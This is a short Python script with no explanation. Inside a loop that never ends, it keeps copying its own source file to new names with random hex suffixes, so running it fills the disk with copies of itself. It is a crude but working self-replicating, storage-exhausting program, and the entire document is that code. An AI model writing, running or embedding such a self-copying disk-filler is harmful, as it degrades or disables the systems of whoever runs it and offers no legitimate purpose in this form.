
import os
import binascii

run = True

while(run == True):

    def replicate(path):
        with open(get_new_filename(path), "w") as newfile, open(path) as program:
            for line in program:
                newfile.write(line)


    def get_new_filename(old_name):
        broken_name = old_name.split('.')
        while True:
            ending = '-' + str(binascii.b2a_hex(os.urandom(3))).replace('\'', '')
            broken_name[-2] = broken_name[-2] + ending
            name = '.'.join(broken_name)
            if not os.path.exists(name):
                break
        return name


    if __name__ == '__main__':
        replicate(__file__)